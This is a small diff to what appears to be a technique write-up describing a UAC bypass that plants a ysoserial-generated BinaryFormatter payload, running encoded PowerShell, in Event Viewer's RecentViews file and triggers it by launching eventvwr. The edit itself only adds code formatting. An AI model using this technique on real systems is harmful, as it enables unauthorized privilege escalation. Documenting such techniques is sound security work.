@@ -33,7 +33,7 @@ ysoserial.exe -o base64 -f BinaryFormatter -g DataSet -c "powershell.exe -nop -e
 
 iii) When `WriteFile` function is executed, it checks if the `Event Viewer` folder exists in AppData and it it doesn't then we create the folder. Finally storing our base64 decoded payload in `RecentViews` file under this folder.
 
-iv) In the end, eventvwr is executed which then executes our payload.
+iv) In the end, `eventvwr` is executed which then executes our payload.
 
 ---
 
